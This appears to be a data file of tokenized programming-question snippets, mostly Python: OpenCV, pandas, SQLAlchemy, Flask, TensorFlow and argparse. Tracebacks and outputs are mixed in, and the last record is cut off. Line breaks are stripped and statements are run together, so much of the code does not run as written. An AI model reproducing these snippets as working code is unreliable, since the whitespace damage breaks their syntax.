"from matplotlib import pyplot as pltimport numpy as npimport cv2img = cv2.imread ( 'usimg1.jpg ' ) mask = np.zeros ( img.shape [ :2 ] , np.uint8 ) bgdModel = np.load ( 'bgdmodel.npy ' ) fgdModel = np.load ( 'fgdmodel.npy ' ) cv2.grabCut ( img , mask , None , bgdModel , fgdModel , 5 , cv2.GC_EVAL ) mask = np.where ( ( mask==2 ) | ( mask==0 ) , 0 , 1 ) .astype ( 'uint8 ' ) img = img * mask [ : , : , np.newaxis ] plt.imshow ( img ) plt.show ( ) cv2.grabCut ( img , mask , rect , bgdModel , fgdModel , 0 , cv2.GC_INIT_WITH_RECT ) cv2.grabCut ( img , mask , rect , bgdModel , fgdModel , 2 , cv2.GC_EVAL )"
"logging.basicConfig ( filename='test.log ' , format= ' % ( levelname ) s % ( message ) s ' , level=logging.DEBUG ) INFO Test [ INFO ] Test"
"import numpy as npimport pandas as pdimport seaborn as snssns.set ( style= '' white '' ) rs = np.random.RandomState ( 5 ) mean = [ 0 , 0 ] cov = [ ( 1 , .5 ) , ( .5 , 1 ) ] x1 , x2 = rs.multivariate_normal ( mean , cov , 500 ) .Tx1 = pd.Series ( x1 , name= '' $ X_1 $ '' ) x2 = pd.Series ( x2 , name= '' $ X_2 $ '' ) g = sns.jointplot ( x1 , x2 , kind= '' kde '' , size=7 , space=0 ) g = sns.jointplot ( x1 , x2 , kind= '' kde '' , size=7 , space=0 , xlim= ( -5,5 ) , ylim= ( -5,5 ) )"
"class KnownValues ( unittest.TestCase ) : known_values = ( ( [ 1 , 2 ] , [ [ 1 , 2 ] ] ) , ( [ 1 , 2 , 3 ] , [ [ 1 , 2 ] , [ 1 , 2 , 3 ] ] ) , ( [ 1 , 2 , 3 , 4 ] , [ [ 1 , 2 ] , [ 1 , 2 , 3 , 4 ] ] ) , ( [ 1 , 2 , 3 , 4 , 5 ] , [ [ 1 , 2 ] , [ 1 , 2 , 3 ] , [ 1 , 2 , 3 , 4 , 5 ] ] ) , ( [ 1 , 2 , 3 , 4 , 5 , 6 ] , [ [ 1 , 2 ] , [ 1 , 2 , 3 ] , [ 1 , 2 , 3 , 4 ] , [ 1 , 2 , 3 , 4 , 5 , 6 ] ] ) , ) def test_check ( self ) : `` 'This should check is the function returning right '' ' for arg , result in self.known_values : print ( `` Testing arg : { } '' .format ( arg ) ) assert program.lister ( arg ) == resultif __name__ == '__main__ ' : unittest.main ( ) Testing started at 19:38 ч . ... Testing arg : [ 1 , 2 ] Process finished with exit code 0 test_check ( __main__.KnownValues ) This should check is the function returning right ... Testing arg : [ 1 , 2 ] ok -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- Ran 1 test in 0.001sOK"
"self.helper.layout = Layout ( Fieldset ( None , 'name ' ) , FormActions ( Submit ( 'submit ' , 'Add Thing ' , css_class='btn-primary ' ) ) )"
"class User ( db.Model , UserMixin ) : id = db.Column ( db.Integer , primary_key=True ) first_name = db.Column ( db.String ( 255 ) ) last_name = db.Column ( db.String ( 255 ) ) email = db.Column ( db.String ( 255 ) , unique=True ) password = db.Column ( db.String ( 255 ) ) active = db.Column ( db.Boolean ( ) ) confirmed_at = db.Column ( db.DateTime ( ) ) roles = db.relationship ( 'Role ' , secondary=roles_users , backref=db.backref ( 'users ' , lazy='dynamic ' ) ) apikeys = db.relationship ( 'Apikey ' , backref='user ' ) def __str__ ( self ) : return self.emailclass Apikey ( db.Model ) : id = db.Column ( db.Integer , primary_key=True ) exch_user = db.Column ( db.String ( 255 ) ) exch_pass = db.Column ( db.String ( 255 ) ) exch_key = db.Column ( db.String ( 255 ) ) exch_secret = db.Column ( db.String ( 255 ) ) user_id = db.Column ( db.Integer , db.ForeignKey ( 'user.id ' ) ) exch_id = db.Column ( db.Integer , db.ForeignKey ( 'exchange.id ' ) ) class Exchange ( db.Model ) : id = db.Column ( db.Integer , primary_key=True ) name = db.Column ( db.String ( 255 ) ) apikeys = db.relationship ( 'Apikey ' , backref='exchange ' ) def __str__ ( self ) : return self.name"
[ buildout ] ... eggs = eggname othereggname ... [ buildout ] ... parts = eggs [ eggs ] recipe = zc.recipe.eggeggs = eggname = othereggname
"# Python 3.7.0 , Pandas 0.23.4from io import StringIOimport pandas as pdimport csv # strings in first 3 columns are of arbitrary lengthx = `` 'ABCD , EFGH , IJKL,34.23 ; 562.45 ; 213.5432MNOP , QRST , UVWX,56.23 ; 63.45 ; 625.234 '' '*10**6def csv_reader_1 ( x ) : df = pd.read_csv ( x , usecols= [ 3 ] , header=None , delimiter= ' , ' , converters= { 3 : lambda x : x.split ( ' ; ' ) } ) return df.join ( pd.DataFrame ( df.pop ( 3 ) .values.tolist ( ) , dtype=float ) ) def csv_reader_2 ( x ) : df = pd.read_csv ( x , header=None , delimiter= ' ; ' , converters= { 0 : lambda x : x.rsplit ( ' , ' ) [ -1 ] } , dtype=float ) return df.astype ( float ) def csv_reader_3 ( x ) : return pd.read_csv ( x , usecols= [ 3 , 4 , 5 ] , header=None , sep= ' , | ; ' , engine='python ' ) def csv_reader_4 ( x ) : with x as fin : reader = csv.reader ( fin , delimiter= ' , ' ) L = [ i [ -1 ] .split ( ' ; ' ) for i in reader ] return pd.DataFrame ( L , dtype=float ) def csv_reader_5 ( x ) : with x as fin : return pd.read_csv ( StringIO ( fin.getvalue ( ) .replace ( ' ; ' , ' , ' ) ) , sep= ' , ' , header=None , usecols= [ 3 , 4 , 5 ] ) res1 = csv_reader_1 ( StringIO ( x ) ) res2 = csv_reader_2 ( StringIO ( x ) ) res3 = csv_reader_3 ( StringIO ( x ) ) res4 = csv_reader_4 ( StringIO ( x ) ) res5 = csv_reader_5 ( StringIO ( x ) ) print ( res1.head ( 3 ) ) # 0 1 2 # 0 34.23 562.45 213.5432 # 1 56.23 63.45 625.2340 # 2 34.23 562.45 213.5432assert all ( np.array_equal ( res1.values , i.values ) for i in ( res2 , res3 , res4 , res5 ) ) % timeit csv_reader_1 ( StringIO ( x ) ) # 5.31 s per loop % timeit csv_reader_2 ( StringIO ( x ) ) # 6.69 s per loop % timeit csv_reader_3 ( StringIO ( x ) ) # 18.6 s per loop % timeit csv_reader_4 ( StringIO ( x ) ) # 5.68 s per loop % timeit csv_reader_5 ( StringIO ( x ) ) # 7.01 s per loop % timeit pd.read_csv ( StringIO ( x ) ) # 1.65 s per loop"
"initial_list = [ [ ' B ' , 'D ' , ' A ' , ' C ' , ' E ' ] ] for state in initial_list : next_dict [ state ] = move ( [ state ] , alphabet ) next_dict = { 'D ' : [ ' E ' ] , ' B ' : [ 'D ' ] , ' A ' : [ ' C ' ] , ' C ' : [ ' C ' ] , ' E ' : [ 'D ' ] } new_list = [ [ ' A ' , ' C ' ] , [ ' B ' , ' E ' ] , [ 'D ' ] ]"
"`` 0 '' , '' 0.23432 '' , '' 234.232342 '' , '' data here dsfsd hfsdf '' , '' 3/1/2016 '' , , '' etc '' , '' E 60 '' '' , '' AD '' 8 '' \n"
"> > > int ( '1e400 ' ) ValueError : invalid literal for int ( ) with base 10 : '1e400 ' > > > int ( float ( '1e400 ' ) ) OverflowError : can not convert float infinity to integer def strtoint ( string ) : parts = string.split ( ' e ' ) if len ( parts ) == 1 : return int ( string ) elif len ( parts ) == 2 : if int ( parts [ 1 ] ) < 0 : return int ( string ) return int ( parts [ 0 ] ) *10**int ( parts [ 1 ] ) else : return int ( string ) # raise a error if the string is invalid , but if the variable string is not a string , it may have other way to convert to an ` int `"
inbound_services : - warmup 0.1.0.3 - - [ 05/Jan/2011:05:49:50 -0800 ] `` GET /_ah/warmup HTTP/1.1 '' 404 1188
"> > > import sys > > > class StdOutHook : ... def write ( self , text ) : ... sys.__stdout__.write ( `` stdout hook received text : % s\n '' % repr ( text ) ) ... > > > class StdErrHook : ... def write ( self , text ) : ... sys.__stderr__.write ( `` stderr hook received text : % s\n '' % repr ( text ) ) ... > > > sys.stdout = StdOutHook ( ) > > > sys.stderr = StdErrHook ( ) > > > > > > def x ( ) : ... print `` Hello , World ! '' ... > > > > > > print x ( ) stdout hook received text : 'Hello , World ! 'stdout hook received text : '\n'stdout hook received text : 'None'stdout hook received text : '\n ' > > >"
"import numpy as npimport pandas as pdimport scipy.stats as stdf = pd.DataFrame ( { ' x ' : np.random.rand ( 10000 ) , ' y ' : np.random.rand ( 10000 ) } ) expanding_corr = df [ ' x ' ] .expanding ( 50 ) .corr ( df [ ' y ' ] ) rolling_corr = df [ ' x ' ] .rolling ( 50 ) .corr ( df [ ' y ' ] ) def custom_roll ( df , w , **kwargs ) : v = df.values d0 , d1 = v.shape s0 , s1 = v.strides a = np.lib.stride_tricks.as_strided ( v , ( d0 - ( w - 1 ) , w , d1 ) , ( s0 , s0 , s1 ) ) rolled_df = pd.concat ( { row : pd.DataFrame ( values , columns=df.columns ) for row , values in zip ( df.index [ ( w-1 ) : ] , a ) } ) return rolled_df.groupby ( level=0 , **kwargs ) c_df = custom_roll ( df , 50 ) .apply ( lambda df : st.pearsonr ( df [ ' x ' ] , df [ ' y ' ] ) )"
"import osimport timeimport numpy as npimport tensorflow as tfstart = time.time ( ) def load_graph ( frozen_graph_filename ) : # We load the protobuf file from the disk and parse it to retrieve the # unserialized graph_def with tf.gfile.GFile ( frozen_graph_filename , `` rb '' ) as f : graph_def = tf.GraphDef ( ) graph_def.ParseFromString ( f.read ( ) ) # Then , we import the graph_def into a new Graph and returns it with tf.Graph ( ) .as_default ( ) as graph : # The name var will prefix every op/nodes in your graph # Since we load everything in a new graph , this is not needed tf.import_graph_def ( graph_def , name= '' '' ) return graphpath_to_graph = '/imagenet/ ' # Path to imagenet folder where graph file is placedGRAPH = load_graph ( os.path.join ( path_to_graph , 'classify_image_graph_def.pb ' ) ) # Create Sessionconfig = tf.ConfigProto ( ) config.gpu_options.per_process_gpu_memory_fraction = 0.9config.gpu_options.allow_growth = Truesession = tf.Session ( graph=GRAPH , config=config ) output_dir = '/vectors/ ' # where to saved vectors from images # Single GPU vectorizationfor image_index , image in enumerate ( selected_list ) : with Image.open ( image ) as f : image_data = f.convert ( 'RGB ' ) feature_tensor = session.graph.get_tensor_by_name ( 'pool_3:0 ' ) feature_vector = session.run ( feature_tensor , { 'DecodeJpeg:0 ' : image_data } ) feature_vector = np.squeeze ( feature_vector ) outfile_name = os.path.basename ( image ) + `` .vc '' out_path = os.path.join ( output_dir , outfile_name ) # Save vector np.savetxt ( out_path , feature_vector , delimiter= ' , ' ) print ( f '' Single GPU : { time.time ( ) - start } '' ) start = time.time ( ) print ( `` Start calculation on multiple GPU '' ) gpus = tf.config.experimental.list_physical_devices ( 'GPU ' ) if gpus : # Create 3 virtual GPUs with 1GB memory each try : tf.config.experimental.set_virtual_device_configuration ( gpus [ 0 ] , [ tf.config.experimental.VirtualDeviceConfiguration ( memory_limit=1024 ) , tf.config.experimental.VirtualDeviceConfiguration ( memory_limit=1024 ) , tf.config.experimental.VirtualDeviceConfiguration ( memory_limit=1024 ) ] ) logical_gpus = tf.config.experimental.list_logical_devices ( 'GPU ' ) print ( len ( gpus ) , `` Physical GPU , '' , len ( logical_gpus ) , `` Logical GPUs '' ) except RuntimeError as e : # Virtual devices must be set before GPUs have been initialized print ( e ) print ( `` Create prepared ops '' ) start1 = time.time ( ) gpus = logical_gpus # comment this line to use physical GPU devices for calculationsimage_list = [ ' 1.jpg ' , ' 2.jpg ' , ' 3.jpg ' ] # list with images to vectorize ( tested on 100 and 1000 examples ) # Assign chunk of list to each GPU # image_list1 , image_list2 , image_list3 = image_list [ : len ( image_list ) ] , \ # image_list [ len ( image_list ) :2*len ( image_list ) ] , \ # image_list [ 2*len ( image_list ) : ] selected_list = image_list # commit this line if you want to try to assign chunk of list manually to each GPUoutput_vectors = [ ] if gpus : # Replicate your computation on multiple GPUs feature_vectors = [ ] for gpu in gpus : # iterating on a virtual GPU devices , not physical with tf.device ( gpu.name ) : print ( f '' Assign list of images to { gpu.name.split ( ' : ' , 4 ) [ -1 ] } '' ) # Try to assign chunk of list with images to each GPU - work the same time as single GPU # if gpu.name.split ( ' : ' , 4 ) [ -1 ] == `` GPU:0 '' : # selected_list = image_list1 # if gpu.name.split ( ' : ' , 4 ) [ -1 ] == `` GPU:1 '' : # selected_list = image_list2 # if gpu.name.split ( ' : ' , 4 ) [ -1 ] == `` GPU:2 '' : # selected_list = image_list3 for image_index , image in enumerate ( selected_list ) : with Image.open ( image ) as f : image_data = f.convert ( 'RGB ' ) feature_tensor = session.graph.get_tensor_by_name ( 'pool_3:0 ' ) feature_vector = session.run ( feature_tensor , { 'DecodeJpeg:0 ' : image_data } ) feature_vectors.append ( feature_vector ) print ( `` All images has been assigned to GPU 's '' ) print ( f '' Time spend on prep ops : { time.time ( ) - start1 } '' ) print ( `` Start calculation on multiple GPU '' ) start1 = time.time ( ) for image_index , image in enumerate ( image_list ) : feature_vector = np.squeeze ( feature_vectors [ image_index ] ) outfile_name = os.path.basename ( image ) + `` .vc '' out_path = os.path.join ( output_dir , outfile_name ) # Save vector np.savetxt ( out_path , feature_vector , delimiter= ' , ' ) # Close sessionsession.close ( ) print ( f '' Calc on GPU 's spend : { time.time ( ) - start1 } '' ) print ( f '' All time , spend on multiple GPU : { time.time ( ) - start } '' ) 1 Physical GPU , 3 Logical GPUsSingle GPU : 18.76301646232605Start calculation on multiple GPUCreate prepared opsAssign list of images to GPU:0Assign list of images to GPU:1Assign list of images to GPU:2All images has been assigned to GPU'sTime spend on prep ops : 18.263537883758545Start calculation on multiple GPUCalc on GPU 's spend : 11.697082042694092All time , spend on multiple GPU : 29.960679531097412"
"class StockItem ( Base ) : __tablename__ = 'stock_items ' stock_id = Column ( Integer , primary_key=True ) description = Column ( String , nullable=False , unique=True ) department = Column ( String ) images = relationship ( 'ImageKey ' , backref='stock_item ' , lazy='dynamic ' ) def __repr__ ( self ) : return ' < StockItem ( Stock ID : { } , Description : { } , Department : { } ) > '.\ format ( self.stock_id , self.description , self.department ) class ImageKey ( Base ) : __tablename__ = 'image_keys ' s3_key = Column ( String , primary_key=True ) stock_id = Column ( Integer , ForeignKey ( 'stock_items.stock_id ' ) ) def __repr__ ( self ) : return ' < ImageKey ( AWS S3 Key : { } , Stock Item : { } ) > '.\ format ( self.s3_key , self.stock_id ) item = StockItem ( stock_id=42 , description='Frobnistication for Foozlebars ' , department='Books ' ) image = ImageKey ( s3_key='listings/images/Frob1.jpg ' , stock_id=42 ) item.images.append ( image ) @ session_managerdef _add_collection_item ( self , Parent , Child , key , collection , session=None , **kwargs ) : `` '' '' Add a Child object to the collection object of Parent . '' '' '' child = self.add_item ( Child , session=session , **kwargs ) parent = session.query ( Parent ) .get ( key ) parent.collection.append ( child ) # This line obviously throws error . session.add ( parent ) db._add_collection_item ( StockItem , ImageKey , 42 , 'images ' , s3_key='listings/images/Frob1.jpg ' , stock_id=42 ) Traceback ( most recent call last ) : File `` C : \Code\development\pyBay\demo1.py '' , line 25 , in < module > stock_id=1 ) File `` C : \Code\development\pyBay\pybay\database\client.py '' , line 67 , in add_context_manager result = func ( self , *args , session=session , **kwargs ) File `` C : \Code\development\pyBay\pybay\database\client.py '' , line 113 , in _add_collection_item parent.collection.append ( child ) AttributeError : 'StockItem ' object has no attribute 'collection '"
"from flask import Flask , redirect , render_template , request , url_forapp = Flask ( __name__ ) app.config [ `` DEBUG '' ] = Trueproductnames = [ ] reviews = [ ] @ app.route ( `` / '' , methods= [ `` GET '' , `` POST '' ] ) def index ( ) : if request.method == `` GET '' : return render_template ( `` main.html '' , reviews=reviews , productnames=productnames ) reviews.append ( request.form [ `` review '' ] ) productnames.append ( request.form [ `` products '' ] ) return redirect ( url_for ( 'index ' ) ) { % for review in reviews % } < tr > < td > < /td > < td > { { review } } < /td > < td > < /td > < /tr > { % endfor % } { % for review , product in zip ( reviews , productname ) % } < tr > < td > { { product } } < /td > < td > { { review } } < /td > < td > < /td > < /tr > { % endfor % } 2018-04-24 12:57:23,957 : File `` /home/FdScGroup/cloudapp/templates/main.html '' , line 43 , in top-level template code2018-04-24 12:57:23,957 : { % for review , product in zip ( reviews , productnames ) % }"
"from fastdtw import fastdtwfrom cdtw import pydtwimport fastdtwimport arrayfrom timeit import default_timer as timerfrom dtaidistance import dtw , dtw_visualisation as dtwviss1 = mySampleSequences [ 0 ] # first sample sequence consisting of 3000 sampless2 = mySampleSequences [ 1 ] # second sample sequence consisting of 3000 samplesstart = timer ( ) distance1 = dtw.distance ( s1 , s2 ) end = timer ( ) start2 = timer ( ) distance2 = dtw.distance_fast ( array.array ( 'd ' , s1 ) , array.array ( 'd ' , s2 ) ) end2 = timer ( ) start3 = timer ( ) distance3 , path3 = fastdtw ( s1 , s2 ) end3 = timer ( ) start4 = timer ( ) distance4 = pydtw.dtw ( s1 , s2 ) .get_dist ( ) end4 = timer ( ) print ( `` dtw.distance ( x , y ) time : `` + str ( end - start ) ) print ( `` dtw.distance ( x , y ) distance : `` +str ( distance1 ) ) print ( `` dtw.distance_fast ( x , y ) time : `` + str ( end2 - start2 ) ) print ( `` dtw.distance_fast ( x , y ) distance : `` + str ( distance2 ) ) print ( `` fastdtw ( x , y ) time : `` + str ( end3 - start3 ) ) print ( `` fastdtw ( x , y ) distance : `` + str ( distance3 ) ) print ( `` pydtw.dtw ( x , y ) time : `` + str ( end4 - start4 ) ) print ( `` pydtw.dtw ( x , y ) distance : `` + str ( distance4 ) )"
"> > > s = [ 1 , 2 , 3 ] > > > t = [ 1 , 2 , 4 ] > > > s > tFalse > > > s < tTrue > > > s = [ 1 , 2 , 3 ] > > > t = [ 1 , 1 , 4 ] > > > s > tTrue > > > s < tFalse"
import pydevdpydevd.set_pm_excepthook ( ) This function is now replaced by GetGlobalDebugger ( ) .setExceptHook and is now controlled by the PyDev UI . ' ) DeprecationWarning : This function is now replaced by GetGlobalDebugger ( ) .setExceptHook and is now controlled by the PyDev UI . GetGlobalDebugger ( ) .setExceptHook ( )
"def fib ( n ) : a , b=0,1 while b < n : print b a , b=b , a+bfib ( 4 ) 1123 def fib ( n ) : a = 0 b = 1 while b < n : print b a = b b = a+bfib ( 4 ) 12"
"from argparse import ArgumentParserp = ArgumentParser ( prog= '' test '' ) p.add_argument ( ' -- bar ' ) sp = p.add_subparsers ( ) sp1 = sp.add_parser ( 'foo ' ) sp1.add_argument ( ' -- baz ' ) p.parse_args ( [ 'foo ' , ' -- bar ' ] ) usage : test [ -h ] [ -- bar BAR ] { foo } ... test : error : unrecognized arguments : -- bar usage : test foo [ -h ] [ -- baz BAZ ] foo : error : unrecognized arguments : -- bar"
"TypeError : A str or unicode value was expected , but int was received instead ( 3902503 ) for x in feed : cf.insert ( uuid.uuid4 ( ) , x ) Traceback ( most recent call last ) : File `` C : \Users\me\Desktop\pro1\src\pro1.py '' , line 73 , in < module > str ( `` swf '' ) : str ( `` aws '' ) File `` c : \Python27\lib\site-packages\pycassa\columnfamily.py '' , line 969 , in insert mut_list = self._make_mutation_list ( columns , timestamp , ttl ) File `` c : \Python27\lib\site-packages\pycassa\columnfamily.py '' , line 504 , in _make_mutation_list columns.iteritems ( ) ) File `` c : \Python27\lib\site-packages\pycassa\columnfamily.py '' , line 503 , in < lambda > return map ( lambda ( c , v ) : Mutation ( self._make_cosc ( _pack_name ( c ) , _pack_value ( v , c ) , timestamp , ttl ) ) , File `` c : \Python27\lib\site-packages\pycassa\columnfamily.py '' , line 462 , in _pack_value return packer ( value ) File `` c : \Python27\lib\site-packages\pycassa\marshal.py '' , line 231 , in pack_bytes % ( v.__class__.__name__ , str ( v ) ) ) TypeError : A str or unicode value was expected , but int was received instead ( 3902503 )"
"├── data│ ├── __init__.py│ ├── migrations│ │ └── __init__.py│ └── models.py├── main.py├── manage.py└── settings.py import os , djangoos.environ.setdefault ( 'DJANGO_SETTINGS_MODULE ' , 'settings ' ) django.setup ( ) from data.models import Foo , Bar # ... print ( Foo.objects.all ( ) ) # this works fine ├── data │ ├── __init__.py │ ├── migrations │ │ └── __init__.py │ └── models.py ├── __init__.py ├── manage.py └── settings.py import os , djangoos.environ.setdefault ( 'DJANGO_SETTINGS_MODULE ' , 'settings ' ) django.setup ( ) from data.models import Foo , Bar # ... from django.db import connection__all__ = [ 'connection ' , 'Foo ' , 'Bar ' , # ... ] import dbprint ( db.Foo.objects.all ( ) ) # this throws an error `` no module named data '' from db import Fooprint ( Foo.objects.all ( ) ) # this throws an error `` no module named settings ''"
if ( $ _SERVER [ 'REQUEST_URI ' ] ! == 'page_with_session.php ' ) { //Instead of 'session_destroy ( ) ; ' this would be used to kill said process }
"def __init__ ( self , root ) : self.root = root self._init_menu ( ) self._init_connectbar ( ) self._init_usertree ( ) self._init_remotetree ( ) self._init_bottom ( )"
"import torchimport torch.nn as nnimport torch.nn.functional as Fclass RNN_LM ( nn.Module ) : def __init__ ( self , hidden_size , vocab_size , embedding_dim=None , droprate=0.5 ) : super ( ) .__init__ ( ) if not embedding_dim : embedding_dim = hidden_size self.embedding_matrix = nn.Embedding ( vocab_size , embedding_dim ) self.lstm = nn.LSTM ( input_size=embedding_dim , hidden_size=hidden_size , batch_first=False ) self.attn = nn.Linear ( hidden_size , hidden_size ) self.vocab_dist = nn.Linear ( hidden_size , vocab_size ) self.dropout = nn.Dropout ( droprate ) def forward ( self , x ) : x = self.dropout ( self.embedding_matrix ( x.view ( -1 , 1 ) ) ) x , states = self.lstm ( x ) # print ( x.size ( ) ) x = x.squeeze ( ) content_vectors = [ x [ 0 ] .view ( 1 , -1 ) ] # for-loop over hidden states and attention for i in range ( 1 , x.size ( 0 ) ) : prev_states = x [ : i ] current_state = x [ i ] .view ( 1 , -1 ) attn_prod = torch.mm ( self.attn ( current_state ) , prev_states.t ( ) ) attn_weights = F.softmax ( attn_prod , dim=1 ) context = torch.mm ( attn_weights , prev_states ) content_vectors.append ( context ) return self.vocab_dist ( self.dropout ( torch.cat ( content_vectors ) ) )"
"def do_data_migration ( apps , schema_editor ) : # Migrate data from Foo to Barclass Migration ( migrations.Migration ) : dependencies = [ ( 'exampleapp ' , 'migration_003 ' ) , ] operations = [ migrations.CreateModel ( # Create the new model Bar ) , migrations.AddField ( # Add the foreign key field to model Foo ) , migrations.RunPython ( do_data_migration ) , migrations.RemoveField ( # Remove the old field from Foo ) , ]"
"host , port = address # the original code in socket.py # My change here : if host == `` www.google.com '' : host = target_ip for res in getaddrinfo ( host , port , 0 , SOCK_STREAM ) : # the original code in socket.py test| -- - main.py| -- - socket.py"
"a= [ 'bbb ' , 'ccc ' , 'axx ' , 'xzz ' , 'xaa ' ] a1= [ 'mix ' , 'xyz ' , 'apple ' , 'xanadu ' , 'aardvark ' , 'xz ' ] xlist= [ ] def sort ( s ) : for i in s : if i [ 0 ] == ' x ' : xlist.append ( i ) s.remove ( i ) print sorted ( xlist ) +sorted ( s ) del xlist [ : ] sort ( a ) sort ( a1 ) [ 'xzz ' , 'axx ' , 'bbb ' , 'ccc ' , 'xaa ' ] [ 'xanadu ' , 'xyz ' , 'xz ' , 'aardvark ' , 'apple ' , 'mix ' ]"
"errors , okays = [ ] , [ ] for r in results : if success_condition ( r ) : okays.append ( r ) else : errors.append ( r )"
"crimeTypes = dict ( crimeData [ `` Crime type '' ] .value_counts ( ) ) crimeType = [ ] totalAmount = [ ] numberOfCrimes = 14for key in sorted ( crimeTypes , key=crimeTypes.get , reverse=True ) : crimeType.append ( key ) totalAmount.append ( crimeTypes.get ( key ) ) crimeType_sample = crimeType [ 0 : numberOfCrimes ] totalAmount_sample = totalAmount [ 0 : numberOfCrimes ] fig1 , ax1 = plt.subplots ( ) ax1.pie ( totalAmount_sample , labels=crimeType_sample , autopct= ' % 1.1f % % ' , shadow=False , startangle=90 ) ax1.axis ( 'equal ' ) # Equal aspect ratio ensures that pie is drawn as a circle.fig1 = plt.gcf ( ) fig1.set_size_inches ( 10,10 ) circle = plt.Circle ( xy= ( 0,0 ) , radius=0.75 , facecolor='white ' ) plt.gca ( ) .add_artist ( circle ) plt.show ( ) ;"
from crcmod import PredefinedCrcfrom gcloud import storage # blob is a gcloud Blob objectshould_download = Truewith open ( 'modifiedFile.txt ' ) as f : hasher = PredefinedCrc ( 'crc-32c ' ) hasher.update ( f.read ( ) ) crc32c = hasher.digest ( ) print crc32c # \207\245.\240 print blob.crc32c # CJKo0A== should_download = crc32c ! = blob.crc32c
"from subprocess import check_outputoutput = check_output ( [ 'snmpget ' , '-v2c ' , '-c ' , 'private ' , '192.168.1.1 ' , ' 1.3.6.1.2.1.1.2.0 ' ] ) print ( output ) from subprocess import check_calldef start_monitoring ( ) : passdef stop_monitoring ( ) : return 0start_monitoring ( ) check_call ( [ 'snmpget ' , '-v2c ' , '-c ' , 'private ' , '192.168.1.1 ' , ' 1.3.6.1.2.1.1.2.0 ' ] ) check_call ( [ 'snmpget ' , '-v2c ' , '-c ' , 'private ' , '192.168.1.1 ' , ' 1.3.6.1.2.1.1.2.0 ' ] ) check_call ( [ 'snmpget ' , '-v2c ' , '-c ' , 'private ' , '192.168.1.1 ' , ' 1.3.6.1.2.1.1.2.0 ' ] ) num_connections = stop_monitoring ( ) assert num_connections == 3"
"> > > b = 1.4 + 2.3 > > > b3.6999999999999997 > > > c = 3.7 > > > c3.7000000000000002 > > > print b , c3.7 3.7 > > > b == cFalse"
"# Read data from GitHubimport pandas as pddf = pd.read_csv ( 'https : //raw.githubusercontent.com/nico/collectiveintelligence-book/master/blogdata.txt ' , sep = '\t ' , index_col = 0 ) data = df.values.tolist ( ) data = data [ 1:10 ] # Define correlation coefficient as distance of choicedef pearson ( v1 , v2 ) : # Simple sums sum1 = sum ( v1 ) sum2 = sum ( v2 ) # Sums of the squares sum1Sq = sum ( [ pow ( v , 2 ) for v in v1 ] ) sum2Sq = sum ( [ pow ( v , 2 ) for v in v2 ] ) # Sum of the products pSum=sum ( [ v1 [ i ] * v2 [ i ] for i in range ( len ( v1 ) ) ] ) # Calculate r ( Pearson score ) num = pSum - ( sum1 * sum2 / len ( v1 ) ) den = sqrt ( ( sum1Sq - pow ( sum1,2 ) / len ( v1 ) ) * ( sum2Sq - pow ( sum2 , 2 ) / len ( v1 ) ) ) if den == 0 : return 0 return num / den # Find largest distancedist= { } max_dist = pearson ( data [ 0 ] , data [ 0 ] ) # Loop over upper triangle of data matrixfor i in range ( len ( data ) ) : for j in range ( i + 1 , len ( data ) ) : # Compute distance for each pair dist_curr = pearson ( data [ i ] , data [ j ] ) # Store distance in dict dist [ ( i , j ) ] = dist_curr # Store max distance if dist_curr > max_dist : max_dist = dist_curr # Euclidean distancedef euclidean ( x , y ) : x = numpy.array ( x ) y = numpy.array ( y ) return numpy.sqrt ( numpy.sum ( ( x-y ) **2 ) ) # Create matrixdef dist_mat ( data ) : dist = { } for i in range ( len ( data ) ) : for j in range ( i + 1 , len ( data ) ) : dist [ ( i , j ) ] = euclidean ( data [ i ] , data [ j ] ) return dist # Returns i & k for max distancedef my_max ( dict ) : return max ( dict ) # Sort functionlist1 = [ ] list2 = [ ] def sort ( rcd , i , k ) : list1.append ( i ) list2.append ( k ) for j in range ( len ( rcd ) ) : if ( euclidean ( rcd [ j ] , rcd [ i ] ) < euclidean ( rcd [ j ] , rcd [ k ] ) ) : list1.append ( j ) else : list2.append ( j ) import pandas as pddf = pd.read_csv ( 'https : //archive.ics.uci.edu/ml/machine-learning-databases/iris/iris.data ' , header = None , sep = ' , ' ) df = df.drop ( 4 , 1 ) df = df [ 1:50 ] data = df.values.tolist ( ) idl=range ( len ( data ) ) dist = create_distance_list ( data ) print sort ( dist , idl ) # Add small random noisefor key in actual : actual [ key ] += np.random.normal ( 0 , 0.005 )"
"from dateutil.parser import parse > > > d1 = parse ( '2008 Apr 2 ' ) > > > d1datetime.datetime ( 2008 , 4 , 2 , 0 , 0 ) > > > d2 = parse ( '2014 Apr ' ) > > > d2datetime.datetime ( 2014 , 4 , 10 , 0 , 0 )"
"( function ( ) { var po = document.createElement ( 'script ' ) ; po.type = 'text/javascript ' ; po.async = true ; po.src = 'https : //plus.google.com/js/client : plusone.js ? onload=render ' ; var s = document.getElementsByTagName ( 'script ' ) [ 0 ] ; s.parentNode.insertBefore ( po , s ) ; } ) ( ) ; function render ( ) { gapi.signin.render ( 'gplusBtn ' , { 'callback ' : 'onSignInCallback ' , 'clientid ' : ' { { CLIENT_ID } } ' , 'cookiepolicy ' : 'single_host_origin ' , 'requestvisibleactions ' : 'http : //schemas.google.com/AddActivity ' , 'scope ' : 'https : //www.googleapis.com/auth/plus.login ' , 'accesstype ' : 'offline ' , 'width ' : 'iconOnly ' } ) ; } var helper = ( function ( ) { var authResult = undefined ; return { onSignInCallback : function ( authResult ) { if ( authResult [ 'access_token ' ] ) { // The user is signed in this.authResult = authResult ; helper.connectServer ( ) ; } else if ( authResult [ 'error ' ] ) { // There was an error , which means the user is not signed in . // As an example , you can troubleshoot by writing to the console : console.log ( 'GPlus : There was an error : ' + authResult [ 'error ' ] ) ; } console.log ( 'authResult ' , authResult ) ; } , connectServer : function ( ) { $ .ajax ( { type : 'POST ' , url : window.location.protocol + '// ' + window.location.host + '/connect ? state= { { STATE } } ' , contentType : 'application/octet-stream ; charset=utf-8 ' , success : function ( result ) { // After we load the Google+ API , send login data . gapi.client.load ( 'plus ' , 'v1 ' , helper.otherLogin ) ; } , processData : false , data : this.authResult.code , error : function ( e ) { console.log ( `` connectServer : error : `` , e ) ; } } ) ; } } } ) ( ) ; /** * Calls the helper method that handles the authentication flow . * * @ param { Object } authResult An Object which contains the access token and * other authentication information . */function onSignInCallback ( authResult ) { helper.onSignInCallback ( authResult ) ; } @ app.route ( '/connect ' , methods= [ 'GET ' , 'POST ' ] ) def connect ( ) : # Ensure that this is no request forgery going on , and that the user # sending us this connect request is the user that was 